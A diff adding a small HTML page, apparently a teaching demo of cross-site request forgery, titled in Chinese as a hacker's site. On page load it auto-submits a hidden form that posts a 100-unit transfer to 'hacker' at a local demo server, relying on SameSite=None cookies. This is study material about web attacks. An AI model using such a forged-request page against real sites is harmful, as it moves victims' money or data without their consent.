@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+  <h1>黑客的站点：CSRF攻击演示</h1>
+
+  <h2>form表单发送POST请求，只发送SameSite=None的cookie</h2>
+  <form
+    id="hacker-form"
+    method="POST"
+    action="http://127.0.0.1:3001/transfer"
+  >
+    <input
+      type="hidden"
+      name="user"
+      value="hacker"
+    />
+    <input
+      type="hidden"
+      name="number"
+      value="100"
+    />
+  </form>
+  <script> document.getElementById('hacker-form').submit(); </script>
+</body>
+
+</html>
